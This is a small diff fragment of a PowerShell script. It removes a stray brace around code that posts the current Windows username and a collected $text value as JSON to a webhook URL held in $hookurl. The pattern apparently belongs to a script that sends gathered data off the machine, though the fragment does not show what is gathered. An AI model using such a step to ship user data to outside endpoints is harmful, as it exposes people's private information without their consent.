@@ -17,7 +17,7 @@ $Body = @{
   'username' = $env:username
   'content' = $text
 }
-}
+
 if (-not ([string]::IsNullOrEmpty($text))){
 Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};
 
